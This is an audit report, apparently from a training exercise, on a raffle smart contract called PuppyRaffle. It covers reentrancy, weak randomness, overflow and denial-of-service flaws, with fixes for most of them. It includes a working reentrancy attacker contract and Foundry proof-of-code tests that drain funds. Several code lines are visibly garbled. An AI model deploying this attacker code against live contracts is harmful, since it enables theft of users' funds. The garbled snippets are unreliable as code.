# Protocol Summary

This project is to enter a raffle to win a cute dog NFT. The protocol should do the following:

1. Call the `enterRaffle` function with the following parameters:
   1. `address[] participants`: A list of addresses that enter. You can use this to enter yourself multiple times, or yourself and a group of your friends.
2. Duplicate addresses are not allowed
3. Users are allowed to get a refund of their ticket & `value` if they call the `refund` function
4. Every X seconds, the raffle will be able to draw a winner and be minted a random puppy
5. The owner of the protocol will set a feeAddress to take a cut of the `value`, and the rest of the funds will be sent to the winner of the puppy.

# Findings

## High

### [H-1] Reentrancy attack in `PuppyRaffle::refund` allows entrant to drain raffle balance

**Description:** The `PuppyRaffle::refund` function does not follow CEI (Checks, Effects, Interactions) and as a result, enables participants to drain the contract balance.

In the `PuppyRaffle::refund` function, we first make an external call to `msg.sender` address and only after making that external call do we update the `PuppyRaffle::players` array.

```javascript
    function refunuint256 playerIndex) public {
        address playerAddress = players[playerIndex];
        require(playerAddress == msg.sender, "PuppyRaffle: Only the player can refund");
        require(playerAddress != address(0), "PuppyRaffle: Player already refunded, or is not active");

@>      payable(msg.sender).sendValue(entranceFee);
@>      players[playerIndex] = address(0);

        emit RaffleRefunded(playerAddress);
    }
```

A player who has entered the raffle could have a `fallback`/`receive` function that calls the `PuppyRaffle::refund` function again and claim another refund. They could continue the cycle till the contract balance is drained.

**Impact:** All fees paid by raffle entrants could be stolen by the malicious participant.

**Proof of Concept:**

1. Users enters the raffle.
2. Attacker sets up a contract with a `fallback` function that calls `PuppyRaffle::refund`.
3. Attacker enters the raffle
4. Attacker calls `PuppyRaffle::refund` from their contract, draining the contract balance.

**Proof of Code**

<details>
<summary>Code</summary>
Add the following code to the `PuppyRaffleTest.t.sol` file.

```javascript


function testReentrance() public playersEntered {
    ReentrancyAttacker attacker = new ReentrancyAttacker(address(puppyRaffle));
    vm.deal(address(attacker), 1e18);uint256 startingAttackerBalance = address(attacker).balance;uint256 startingContractBalance = address(puppyRaffle).balance;

    attacker.attack();
uint256 endingAttackerBalance = address(attacker).balance;uint256 endingContractBalance = address(puppyRaffle).balance;
    assertEq(endingAttackerBalance, startingAttackerBalance + startingContractBalance);
    assertEq(endingContractBalance, 0);
}
```

And this contract as well

```javascript
contract ReentrancyAttacker {
    PuppyRaffle puppyRaffle;uint256 entranceFee;uint256 attackerIndex;

    constructor(address _puppyRaffle) {
        puppyRaffle = PuppyRaffle(_puppyRaffle);
        entranceFee = puppyRaffle.entranceFee();
    }

    function attack() external payable {
        address[] memory players = new address[](1);
        players[0] = address(this);
        puppyRaffle.enterRaffle{value: entranceFee}(players);
        attackerIndex = puppyRaffle.getActivePlayerIndex(address(this));
        puppyRaffle.refund(attackerIndex);
    }

    fallback() external payable {
        if (address(puppyRaffle).balance >= entranceFee) {
            puppyRaffle.refund(attackerIndex);
        }
    }
}
```

</details>

**Recommended Mitigation:** To fix this, we should have the `PuppyRaffle::refund` function update the `players` array before making the external call. Additionally, we should move the event emission up as well.

```diff
    function refunuint256 playerIndex) public {
        address playerAddress = players[playerIndex];
        require(playerAddress == msg.sender, "PuppyRaffle: Only the player can refund");
        require(playerAddress != address(0), "PuppyRaffle: Player already refunded, or is not active");
+       players[playerIndex] = address(0);
+       emit RaffleRefunded(playerAddress);
        (bool success,) = msg.sender.call{value: entranceFee}("");
        require(success, "PuppyRaffle: Failed to refund player");
-        players[playerIndex] = address(0);
-        emit RaffleRefunded(playerAddress);
    }
```

### [H-2] Weak randomness in `PuppyRaffle::selectWinner` allows users to influence or predict the winner and influence or predict the winning puppy

**Description:** Hashing `msg.sender` , `block.timstampt` and `block.difficulty` together creates a predictable find number. A predictable number is not a good random number. Malicious users can manipulate these values or know them ahead of time to choose the winner of the raffle themselves.

_Note:_ This additionally means users could front-run this function and call `refund` if they see they are not the winner.
**Impact:** Any user can influence the winner of the raffle, winning the money and selecting the `rarest` puppy. Making the entire raffle worthless if it becomes a gas war as to who wins the raffles

**Proof of Concept:**

1. Validators can know ahead of time the `block.timestamp` and `block.difficulty` and use that knowledge to predict when / how to participate. See the [solidity blog on prevrando](https://soliditydeveloper.com/prevrandao) here. `block.difficulty` was recently replaced with `prevrandao`.
2. Users can manipulate the `msg.sender` value to result in their index being the winner.
3. Users can revert their `selectWinner` transaction if they do not like the winner or resulting puppy.

Using on-chain values as a randomness seed is a [well-known attack vector](https://betterprogramming.pub/how-to-generate-truly-random-numbers-in-solidity-and-blockchain-9ced6472dbdf) in the blockchain space.

**Recommended Mitigation:** Consider using a cryptographically provable random number generator such as Chainlink VRF.

### [H-3] Interger overflow of `PuppyRaffle::totalFees` loses fees

**Description:** In solodity versions prior to `0.8.0` intergers were subject to interger overflows.

```javascript
    uint64 myVar = type(uint64).max
    //18446744073709551615
    myVar = myVar + 1
    // myVar will be 0
```

**Impact:** In `PuppyRaffle::selectWinner` , `totalFees` are accumulated for the `feeAddress` to collect later in `PuppyRaffle::withdrawFees`. However, if the `totalFees` variable overflows, the `feeAddress` may not collect the correct amount of fees, leaving fees permanently stuck in the contract.

**Proof of Concept:**

1. We first conclude a raffle of 4 players to collect some fees.
2. We then have 89 additional players enter a new raffle, and we conclude that raffle as well.
3. `totalFees` will be:

```javascript
totalFees = totalFees + uint64(fee);
// substituted
totalFees = 800000000000000000 + 17800000000000000000;
// due to overflow, the following is now the case
totalFees = 153255926290448384;
```

4. You will now not be able to withdraw, due to this line in `PuppyRaffle::withdrawFees`:

```javascript
require(address(this).balance ==
  uint256(totalFees), "PuppyRaffle: There are currently players active!");
```

Although you could use `selfdestruct` to send ETH to this contract in order for the values to match and withdraw the fees, this is clearly not what the protocol is intended to do.

<details>
<summary>Proof Of Code</summary>
Place this into the `PuppyRaffleTest.t.sol` file.

```javascript
function testTotalFeesOverflow() public playersEntered {
        // We finish a raffle of 4 to collect some fees
        vm.warp(block.timestamp + duration + 1);
        vm.roll(block.number + 1);
        puppyRaffle.selectWinner();
        uint256 startingTotalFees = puppyRaffle.totalFees();
        // startingTotalFees = 800000000000000000

        // We then have 89 players enter a new raffle
        uint256 playersNum = 89;
        address[] memory players = new address[](playersNum);
        for (uint256 i = 0; i < playersNum; i++) {
            players[i] = address(i);
        }
        puppyRaffle.enterRaffle{value: entranceFee * playersNum}(players);
        // We end the raffle
        vm.warp(block.timestamp + duration + 1);
        vm.roll(block.number + 1);

        // And here is where the issue occurs
        // We will now have fewer fees even though we just finished a second raffle
        puppyRaffle.selectWinner();

        uint256 endingTotalFees = puppyRaffle.totalFees();
        console.log("ending total fees", endingTotalFees);
        assert(endingTotalFees < startingTotalFees);

        // We are also unable to withdraw any fees because of the require check
        vm.prank(puppyRaffle.feeAddress());
        vm.expectRevert("PuppyRaffle: There are currently players active!");
        puppyRaffle.withdrawFees();
    }
```

</details>

**Recommended Mitigation:**There are a few recommended mitigations here.

1. Use a newer version of Solidity that does not allow integer overflows by default.

```diff
- pragma solidity ^0.7.6;
+ pragma solidity ^0.8.18;
```

Alternatively, if you want to use an older version of Solidity, you can use a library like OpenZeppelin's `SafeMath` to prevent integer overflows.

2. Use a `uint256` instead of a `uint64` for `totalFees`.

```diff
- uint64 public totalFees = 0;
+ uint256 public totalFees = 0;
```

3. Remove the balance check in `PuppyRaffle::withdrawFees`

```diff
- require(address(this).balance == uint256(totalFees), "PuppyRaffle: There are currently players active!");
```

There are more attack vectors with that final require, so we recommend removing it regardless.

## Medium

### [M-1] Looping through players array to check for duplicates in `PuppyRaffle::enterRaffle` is potential denial of service (Dos) attack, incrementing gas costs for future entrants

**Description:** The `PuppyRaffle::enterRaffle` function loops through the `players` array to check for duplicates. However, the longer the `PuppyRaffle::players` array is, the more checks a new player will have to make. This means the gas costs for players who enter right when the raffle stats will be dramatically lower tha those who enter later. Every additional address in the `players` array, is an additional check the loop will have to make.

```javascript
// @audit Dos attack
@>       foruint256 i = 0; i < players.length - 1; i++) {
            foruint256 j = i + 1; j < players.length; j++) {
                require(players[i] != players[j], "PuppyRaffle: Duplicate player");
            }
        }
```

**Impact:** The gas costs for raffle entrants will greatly increase as more players enter the raffle. Discouraging later users from entering, and causing a rush at the start of a raffle to be one of the first entrants in the queue.

An attacker might make the `PuppyRaffle::entrants` array so big, that no one else enters, guarenteeing themselves the win.

**Proof of Concept:**

If we have 2 sets of 100 players enter, the gas costs will be as such:

- 1st 100 players : ~6252048 gas
- 2nd 100 players: ~18068138 gas

This more than 3x more expensive for the second 100 players.

<details>
<summary>Code</summary>
Add the following code to the `PuppyRaffleTest.t.sol` file.

```javascript
function test_denialOfService() public {
        // address[] memory players = new address[](1);
        // players[0] = playerOne;
        // puppyRaffle.enterRaffle{value: entranceFee}(players);
        // assertEq(puppyRaffle.players(0), playerOne);
        vm.txGasPrice(1);

        // let's enter 100 players
uint256 playersNum = 100;
        address[] memory players = new address[](playersNum);
        foruint256 i = 0; i < playersNum; i++) {
            players[i] = address(i);
        }

        // see how much gas it costs
uint256 gasStart = gasleft();
        puppyRaffle.enterRaffle{value: entranceFee * players.length}(players);
uint256 gasEnd = gasleft();

uint256 gasUsedFirst = (gasStart - gasEnd) * tx.gasprice;
        console.log("Gas cost of the first 100 players: ", gasUsedFirst);

        // now for the 2nd 100 players
        address[] memory playersTwo = new address[](playersNum);
        foruint256 i = 0; i < playersNum; i++) {
            playersTwo[i] = address(i + playersNum);
        }

        // see how much gas it costs
uint256 gasStartSecond = gasleft();
        puppyRaffle.enterRaffle{value: entranceFee * players.length}(playersTwo);
uint256 gasEndSecond = gasleft();

uint256 gasUsedSecond = (gasStartSecond - gasEndSecond) * tx.gasprice;
        console.log("Gas cost of the second 100 players: ", gasUsedSecond);

        assert(gasUsedFirst < gasUsedSecond);
    }
```

</details>

**Recommended Mitigation:**

### [M-2] Unsafe cast of `PuppyRaffle::fee` loses fees

**Description:** In `PuppyRaffle::selectWinner` their is a type cast of a `uint256` to a `uint64`. This is an unsafe cast, and if the `uint256` is larger than `type(uint64).max`, the value will be truncated.

```javascript
    function selectWinner() external {
        require(block.timestamp >= raffleStartTime + raffleDuration, "PuppyRaffle: Raffle not over");
        require(players.length > 0, "PuppyRaffle: No players in raffle");

        uint256 winnerIndex = uint256(keccak256(abi.encodePacked(msg.sender, block.timestamp, block.difficulty))) % players.length;
        address winner = players[winnerIndex];
        uint256 fee = totalFees / 10;
        uint256 winnings = address(this).balance - fee;
@>      totalFees = totalFees + uint64(fee);
        players = new address[](0);
        emit RaffleWinner(winner, winnings);
    }
```

The max value of a `uint64` is `18446744073709551615`. In terms of ETH, this is only ~`18` ETH. Meaning, if more than 18ETH of fees are collected, the `fee` casting will truncate the value.

**Impact:** This means the `feeAddress` will not collect the correct amount of fees, leaving fees permanently stuck in the contract.

**Proof of Concept:**

1. A raffle proceeds with a little more than 18 ETH worth of fees collected
2. The line that casts the `fee` as a `uint64` hits
3. `totalFees` is incorrectly updated with a lower amount

You can replicate this in foundry's chisel by running the following:

```javascript
uint256 max = type(uint64).max
uint256 fee = max + 1
uint64(fee)
// prints 0
```

**Recommended Mitigation:** Set `PuppyRaffle::totalFees` to a `uint256` instead of a `uint64`, and remove the casting. Their is a comment which says:

```javascript
// We do some storage packing to save gas
```

But the potential gas saved isn't worth it if we have to recast and this bug exists.

```diff
-   uint64 public totalFees = 0;
+   uint256 public totalFees = 0;
.
.
.
    function selectWinner() external {
        require(block.timestamp >= raffleStartTime + raffleDuration, "PuppyRaffle: Raffle not over");
        require(players.length >= 4, "PuppyRaffle: Need at least 4 players");
        uint256 winnerIndex =
            uint256(keccak256(abi.encodePacked(msg.sender, block.timestamp, block.difficulty))) % players.length;
        address winner = players[winnerIndex];
        uint256 totalAmountCollected = players.length * entranceFee;
        uint256 prizePool = (totalAmountCollected * 80) / 100;
        uint256 fee = (totalAmountCollected * 20) / 100;
-       totalFees = totalFees + uint64(fee);
+       totalFees = totalFees + fee;
```

### [M-3] Smart contract wallets raffle winners without a `receive` or a `fallback` function will block the start of a new contest

**Description:** The `PuppyRaffle::selectWinner` function is responsible for resetting the lottery. However if the winner is a smart contract wallet that rejects payment, the lottery would not be able to restart.

Users could easily call the `selectWinner` function again and non-wallet entrants could enter, but it could cost a lot due to the duplicate check and a lottery reset could get very challenging.

**Impact:** The `PuppyRaffle::selectWinner` function could revert many times, making a lottery reset difficult.

Also, true winners would not get paid out and someone else could take their money!

**Proof of Concept:**

1. 10 smart contract wallets enter the lottery without a fallback or receive function.
2. The lottery ends
3. The `selectWinner` function wouldn't work, even though the lottery is over!

**Recommended Mitigation:** There are a few options to mitigate this issue.

1. Do not allow smart contract wallet entrants (not recommended)
2. Create a mapping of addresses -> payout amounts so winners can pull their funds out themselves with a new `claimPrize` function, putting the owness on the winner to claim their prize. (Recommended)

> Pull over Push

## Low

### [L-1] `PuppyRaffle::getActivePlayerIndex` returns 0 for non-existent players and for players at index 0, causing a player at index 0 to incorrectly think they have not entered the raffle

**Description:** If a player is in the `PuppyRaffle::players` array at index 0, this will return 0, but according to the natspec, it will also return 0 if the player is not in the array.

```javascript
/// @return the index of the player in the array, if they are not active, it returns 0
 function getActivePlayerIndex(address player) external view returnsuint256) {
        foruint256 i = 0; i < players.length; i++) {
            if (players[i] == player) {
                return i;
            }
        }
        return 0;
    }
```

**Impact:** A player at index 0 may incorrectly think they have not entered the raffle and attempt to enter the raffle again, wasting gas.

**Proof of Concept:**

1. User enter the raffle, they are the first entrent.
2. `PuppyRaffle::getActivePlayerIndex` returns 0
3. User thinks they have not entered correctly due to the function documentation

**Recommended Mitigation:** The easiest recommendation would be to revert if the player is not in the array instead of returning 0.

You could also reserve the 0th position for any competition, but a better solution might be to return an `int256` where the function returns -1 if the player is not active.

### [G-1] Unchanged state variables should be declared constant or immutable

Reading from storage is much more expensive that reading from a constant or immatable variable.

Instances:

- `Puppyraffle::raffleDuration` should be `immutable`
- `Puppyraffle::commonImageUri` should be `constant`
- `Puppyraffle::rareImageUri` should be `constant`
- `Puppyraffle::legendaryImageUri` should be `constant`

### [G-2] Storage variables in a loop should be cached

Everytime you call `players.length` you read from storage, as opposed to memory which is more gas efficient

```diff
+ uint256 playerLength = players.length;
-     foruint256 i = 0; i < players.length - 1; i++) {
+     foruint256 i = 0; i < playerLength - 1; i++) {
-            foruint256 j = i + 1; j < players.length; j++) {
+            foruint256 j = i + 1; j < playerLength; j++) {
                require(players[i] != players[j], "PuppyRaffle: Duplicate player");
            }
        }
```

## Informational/Non-Crits

### [I-1]: Solidity pragma should be specific, not wide

Consider using a specific version of Solidity in your contracts instead of a wide version. For example, instead of `pragma solidity ^0.8.0;`, use `pragma solidity 0.8.0;`

- Found in src/PuppyRaffle.sol: Line: 2

### [I-2]: Using an outdated version of Solidity is not recommend

### [I-3]: Missing checks for `address(0)` when assigning values to address state variables

Assigning values to address state variables without checking for `address(0)`.

### [I-4] `PuppyRaffle::selectWinner` does not follow CEI, which is not a best practice

It's best to keep code clean and follow CEI

```diff
-       (bool success,) = winner.call{value: prizePool}("");
-      require(success, "PuppyRaffle: Failed to send prize pool to winner");
        _safeMint(winner, tokenId);
+       (bool success,) = winner.call{value: prizePool}("");
+      require(success, "PuppyRaffle: Failed to send prize pool to winner");
```

### [I-5] Use of "magic" numbers is discouraged

It can be confusing to see number literals in a codebase, and it's much more readable if the numbers are given a name

Examples:

```javascript
    uint256 prizePool = (totalAmountCollected * 80) / 100;
    uint256 fee = (totalAmountCollected * 20) / 100;
```

Instead, you can use:

```javascript
    uint256 public constant PRIZE_POOL_PERCENTAGE = 80;
    uint256 public constant FEE_PERCENTAGE = 20;
    uint256 public constant POOL_PERCENTAGE = 100;
```

### [I-6] State changes are missing events

### [I-7] `PuppyRaffle::_isActivePlayer` is never used and should be removed
